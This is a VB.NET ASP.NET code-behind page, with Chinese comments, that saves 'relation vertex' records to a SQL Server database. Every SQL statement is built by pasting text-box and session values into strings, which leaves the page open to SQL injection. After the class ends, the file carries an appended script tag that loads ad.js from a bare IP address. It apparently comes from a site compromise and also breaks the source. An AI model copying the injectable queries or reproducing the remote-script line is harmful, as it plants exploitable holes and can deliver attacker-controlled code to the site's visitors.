Imports System.Data
Imports System.Data.SqlClient

Public Class to1
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Label7 As System.Web.UI.WebControls.Label
    Protected WithEvents Label8 As System.Web.UI.WebControls.Label
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents Label5 As System.Web.UI.WebControls.Label
    Protected WithEvents Label6 As System.Web.UI.WebControls.Label
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents txtVertexKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtInstKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents ddlstVertex As System.Web.UI.WebControls.DropDownList
    Protected WithEvents txtVertexName As System.Web.UI.WebControls.TextBox
    Protected WithEvents rbtnIsValidYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsValidNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents btnSave As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码

        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If
        If Not IsPostBack Then
            Me.txtInstKey.Enabled = False
            Me.txtInstKey.Text = Me.Session("InstKey")
            Me.rbtnIsValidYes.Checked = True

            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Dim myDateSet As New DataSet
            Try
                mySqlConn.Open()

                strSql = [String].Format("select * from rdefinition where rdefinitionkey='{0}'", Me.Session("DefKey"))
                Dim mySqlAdapter As New SqlDataAdapter(strSql, mySqlConn)

                mySqlAdapter.Fill(myDateSet, "rdefinition")
                mySqlConn.Close()
            Catch ex As SqlException
                Throw ex
                'Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try

            Dim inum As Integer = myDateSet.Tables("rdefinition").Rows(0).Item("relatedobjnum")
            Dim i As Integer
            Dim ss As String = "abcdefghijklmnopqrstuvwxyz"
            For i = 0 To inum - 1
                Me.ddlstVertex.Items.Add(ss.Substring(i, 1))
            Next
        End If
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        Me.txtVertexKey.Text = ""
        Me.txtVertexName.Text = ""
        Me.ddlstVertex.SelectedIndex = 0
        Me.rbtnIsValidNo.Checked = False
        Me.rbtnIsValidYes.Checked = True
    End Sub

    Private Sub btnSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSave.Click
        If (Me.txtVertexKey.Text.Trim() = "" Or Me.txtVertexName.Text.Trim() = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If
        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = [String].Format("select * from rvertex where rvertexkey='{0}' or (relationkey='{1}' and vorder='{2}')", _
            Me.txtVertexKey.Text.Trim(), Me.txtInstKey.Text.Trim(), Me.ddlstVertex.SelectedValue)
       
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "警告：该关系项点编号已存在或名称已指定，请输入新的关系断言编号或选择不同的关系项点序号"
                lblWarning.Visible = True
            Else
                ' 获取是否有效保存在chrIsDir中
                Dim chrIsValid As Char

                If Me.rbtnIsValidYes.Checked = True Then
                    chrIsValid = "1"
                Else
                    chrIsValid = "0"
                End If

                ' 插入数据项
                strSql = [String].Format("insert into rvertex values('{0}', '{1}', '{2}', '{3}', '{4}')", _
                    Me.txtVertexKey.Text.Trim(), Me.txtInstKey.Text.Trim(), Me.ddlstVertex.SelectedValue, _
                    Me.txtVertexName.Text.Trim(), chrIsValid)
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "恭喜：添加关系项点" + Me.txtVertexKey.Text.Trim() + "成功，请继续或下一步"
                    Me.lblWarning.Visible = True
                    Me.txtVertexKey.Text = ""
                    Me.txtVertexName.Text = ""
                    Me.rbtnIsValidNo.Checked = False
                    Me.rbtnIsValidYes.Checked = True
                    Me.ddlstVertex.SelectedIndex = 0
                Else
                    Me.lblWarning.Text = "警告：由于某种原因添加关系项点失败，可能你没有权限"
                    Me.lblWarning.Visible = True
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
